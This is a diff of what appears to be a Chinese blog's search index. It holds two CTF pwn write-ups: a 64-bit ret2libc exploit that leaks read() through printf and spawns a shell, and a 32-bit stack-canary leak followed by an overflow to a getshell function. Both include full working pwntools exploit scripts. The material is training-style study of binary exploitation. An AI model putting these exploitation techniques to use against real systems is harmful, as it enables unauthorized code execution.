@@ -226,15 +226,15 @@
   </entry>
   <entry>
     <title>64位ret2libc_用printf泄露read实际地址</title>
-    <url>/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/</url>
+    <url>/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/</url>
     <content><![CDATA[<p>64位程序，ret2libc类题目，用printf泄露read实际地址</p>
 <p>checksec：</p>
-<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222156215.png" alt="image-20210922222156215"></p>
+<p><img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222156215.png" alt="image-20210922222156215"></p>
 <p>ida：</p>
 <p>伪代码</p>
-<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222623857.png" alt="image-20210922222623857"></p>
+<p><img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222623857.png" alt="image-20210922222623857"></p>
 <p>main函数</p>
-<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222536787.png" alt="image-20210922222536787"></p>
+<p><img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222536787.png" alt="image-20210922222536787"></p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#printf()	参数如下:①format（%s格式化字符串地址）②打印内容 ③打印字符数目</span></span><br><span class="line"><span class="comment">#64位ret2libc使用printf泄露read实际地址</span></span><br><span class="line"><span class="comment">#打远程时不会出错，打本地时会出错。</span></span><br><span class="line"><span class="comment">#2021.9.22解决，将main地址</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29119</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn28&#x27;)</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400731</span></span><br><span class="line">format_addr = <span class="number">0x0000000000400770</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn28&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]	<span class="comment">#0x400636 这个地址远程可以用，但本地不行。</span></span><br><span class="line">main = <span class="number">0x400637</span>				<span class="comment">#这个地址远程本地都能用。</span></span><br><span class="line">read_got =elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(format_addr)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(<span class="number">1</span>)+p64(printf_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#read_addr = u64(io.recv(8))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;this:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;____this:&#x27;</span>+<span class="built_in">hex</span>(main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libcbase = read_addr -libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
 
@@ -244,15 +244,15 @@
 </ul>
 <p><strong>解决方法及思路：</strong></p>
 <ul>
-<li><p>本机libc版本：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223533015.png" alt="image-20210922223533015"></p>
-<p>远程libc版本：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223701204.png" alt="image-20210922223701204"></p>
+<li><p>本机libc版本：<img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223533015.png" alt="image-20210922223533015"></p>
+<p>远程libc版本：<img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223701204.png" alt="image-20210922223701204"></p>
 </li>
 <li><p>从上面可以看到，我的libc版本是2.31的，而靶机的libc版本是2.23的，这样就导致了一个问题。</p>
-<p>==<strong>当glibc版本大于2.27的时，系统调用system(“/bin/sh”)之前有个xmm寄存器使用。要确保rsp是与16对齐的，也就是末尾必须是0.</strong>==</p>
+<p>==<strong>当glibc版本大于2.27的时，系统调用system(“/bin/sh”)之前有个xmm寄存器使用。要确保rsp是与16对齐的，也就是末尾必须是0</strong>==</p>
 </li>
-<li><p>下面摘抄一段：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224515487.png" alt="image-20210922224515487"><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224338013.png" alt="image-20210922224338013"></p>
+<li><p>下面摘抄一段：<img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224515487.png" alt="image-20210922224515487"><img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224338013.png" alt="image-20210922224338013"></p>
 </li>
-<li><p>就是说这边的0x40036这个地址不能用了，他没有被16字节整除。这样的话，不执行push，转而使用0x400637这个地址就解决了。<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223956307.png" alt="image-20210922223956307"></p>
+<li><p>就是说这边的0x40036这个地址不能用了，他没有被16字节整除。这样的话，不执行push，转而使用0x400637这个地址就解决了。<img src="/2021/09/22/64%E7%A8%8B%E5%BA%8F%E4%B9%8Bret2libc%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223956307.png" alt="image-20210922223956307"></p>
 </li>
 </ul>
 <p><strong>注意点：</strong></p>
@@ -267,6 +267,62 @@
       <tags>
         <tag>pwn</tag>
         <tag>ret2libc</tag>
+        <tag>64位</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>32位程序canary泄露</title>
+    <url>/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<p>32位程序的canary泄露</p>
+<p>checksec：</p>
+<p><img src="/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/image-20210924130155526.png" alt="image-20210924130155526"></p>
+<ul>
+<li>开启了canary保护</li>
+</ul>
+<p>ida：</p>
+<ul>
+<li>主函数</li>
+</ul>
+<p><img src="/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/image-20210924130257204.png" alt="image-20210924130257204"></p>
+<ul>
+<li>vlun（）函数</li>
+</ul>
+<p><img src="/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/image-20210924130343614.png" alt="image-20210924130343614"></p>
+<p>可以看到，程序进行了一读一写，一读一写两次循环。</p>
+<p>由于程序开启了canary保护，所以我们不能直接进行溢出。需要先泄露canary的值，然后利用程序中的printf函数来将canary答应出来，由此构造第一个payload。接着知晓canary之后，就可以构造第二个payload进行下一步的溢出了。</p>
+<p><strong>在这里说明一下canary的结构</strong></p>
+<ul>
+<li><p>Canary设计**==以字节\x00结尾==<strong>，本意是保证Canary可以截断字符串。泄露栈中的Canary的思路是</strong>覆盖Canary的低字节**（即覆盖掉‘‘ <strong>\x00</strong> ’’，让其不能截断字符串，使其和字符串连接为一串。），来打印出剩余的Canary部分。需要合适的输出函数，并且需要先泄露Canary，之后再次溢出控制执行流程。</p>
+</li>
+<li><p>需要注意：Canary一般最低位是\x00，也就是结尾处，64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节。</p>
+<p><strong>例如</strong>：</p>
+<p>这是一个4字节的Canary:    <strong>0xde4ab400</strong></p>
+<p>它的组成为前三个字节的随机部分加上固定结尾00，64字节同理。</p>
+<p><img src="/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/image-20210924131555705.png" alt="image-20210924131555705"></p>
+<p>上图所示的canary，我们使其最低位00被41所覆盖，这样它便不会被\x00截断，并使它和前面的字符串连接起来，最后将其打印出来便可得到canary的值。</p>
+</li>
+<li><p>canary的位置不一定与ebp存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时canary位置可能出现偏差，有可能ebp与canary之间有字节被随机填充</p>
+<p><strong>例如：</strong></p>
+<p><img src="/2021/09/24/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B9%8Bcanary%E6%B3%84%E9%9C%B2/image-20210924132941441.png" alt="image-20210924132941441"></p>
+<p>canary与ebp相差c个字节。</p>
+</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;pwn04&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn04&#x27;</span>)</span><br><span class="line">get_shell = ELF(<span class="string">&#x27;./pwn04&#x27;</span>).sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">101</span>)</span><br><span class="line"><span class="comment">#Canary = io.recv(4)</span></span><br><span class="line"><span class="comment">#Canary = Canary.ljust(4,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#Canary = u32(Canary)-0xa  #这里的-a是将读到的换行（\n即0x0a）给减掉。</span></span><br><span class="line">Canary = u32(io.recv(<span class="number">3</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">100</span>+p32(Canary)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(get_shell)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = buf + canary + canary到返回地址的大小 + 返回地址</span></span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结：</strong></p>
+<ul>
+<li>泄露canary时的payload多样，能收到canary有效部分即可。</li>
+</ul>
+<p>参考链接：<a href="https://blog.csdn.net/AcSuccess/article/details/104115114">Canary学习（泄露Canary）_至臻求学，胸怀云月-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>canary</tag>
+        <tag>32位</tag>
       </tags>
   </entry>
 </search>
